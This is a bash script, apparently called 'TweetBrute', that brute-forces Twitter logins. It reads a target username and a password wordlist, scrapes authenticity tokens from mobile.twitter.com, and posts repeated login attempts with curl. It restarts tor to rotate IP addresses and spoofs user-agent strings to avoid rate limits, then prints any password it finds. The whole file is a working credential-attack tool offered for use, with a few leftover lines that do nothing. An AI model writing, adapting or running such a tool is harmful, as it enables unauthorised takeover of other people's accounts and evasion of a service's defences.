#!/bin/bash

#colors
green='\033[1;32m'
red='\033[0;31m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
lightcyan='\e[96m'
blink='\e[5m'

which openssl > /dev/null 2>&1
if [[ "$?" == "1" ]]; then
echo -e "$red you need openssl to run this script!"
exit 1
fi

which curl > /dev/null 2>&1
if [[ "$?" == "1" ]]; then
echo -e "$red you need curl to run this script!"
exit 1
fi

banner() {

echo -e " $red  _______                        __  $lightcyan ______              __          $farblos  "        
echo -e " $red |_     _|.--.--.--.-----.-----.|  |_$lightcyan|   __ \.----.--.--.|  |_.-----. $farblos  "
echo -e " $red   |   |  |  |  |  |  -__|  -__||   _$lightcyan|   __ <|   _|  |  ||   _|  -__| $farblos  "
echo -e " $red   |___|  |________|_____|_____||____$lightcyan|______/|__| |_____||____|_____|  $farblos  "
echo ""
echo -e "$BlueF coded by Fadester $farblos"
echo -e "$BlueF v1.0 $farblos"    
echo ""

}

bruteforcer() {
_start=1
_end=1
while [ true ]; do
for pass in $(sed -n ''$_start','$_end'p' $wl); do 

uagent="Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"
token=0

hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Twitter 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
phone="$string8-$string4-$string4-$string4-$string12"
device="android-$string16"
guid="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
COOKIES='cookies'$countpass''
countpass=$(grep -n "$pass" "$wl" | cut -d ":" -f1)

echo -e "$cyan[$red*$cyan]$yellow Try pass $green$pass"

initpage=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new") 

tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) 
var=$(curl   -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$user&session[password]=$pass&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions") 

if [[ "$var" == *"If you’re not redirected soon"* ]]; then pw_found_verify ; rm -rf cookies*; kill -1 $$
elif [[ "$var" == *"/account/login_challenge"* ]]; then pw_found ; rm -rf cookies*; kill -1 $$ 
elif [[ "$var" == *"/compose/tweet"* ]]; then pw_found ; rm -rf cookies*; kill -1 $$; fi & done; wait $!

let _start++
let _end++
if [[ $countpass == $_start ]]; then 
    echo ""
    echo -e "$cyan[$red!$cyan]$yellow Wordlist end$red! $farblos "
    exit 1
fi
killall -HUP tor > /dev/null 2>&1 
done

}

pw_found() {

echo -e "$cyan[$red+$cyan]$magenta Password found$red! $farblos \n"
echo -e "$cyan[$red+$cyan]$green Username: $BlueF$user $farblos \n"
echo -e "$cyan[$red+$cyan]$green Password: $BlueF$pass  $farblos \n"
exit 1
}

pw_found_verify() {

echo ""
echo -e "$cyan[$red+$cyan]$magenta Password found$red! $farblos "
echo -e "$cyan[$red+$cyan]$green Username: $BlueF$user $farblos "
echo -e "$cyan[$red+$cyan]$green Password: $BlueF$pass $farblos "
echo -e "$cyan[$red!$cyan]$yellow You need to verify$red! $farblos "
exit 1

}

eingabe() {

read -p $' \e[0;36m[\033[0;31m+\e[0;36m]\e[0m\e[1;93m Username: \e[0m' user 
read -p $' \e[0;36m[\033[0;31m+\e[0;36m]\e[0m\e[1;93m Wordlist: \e[0m' wl 
chars_wl=$(wc -w $wl | cut -d " " -f1)
echo ""
echo -e " $green$chars_wl Passwords loaded"
sleep 1
echo -e "$red Starting"
echo ""
sleep 1
bruteforcer
} 

banner
eingabe
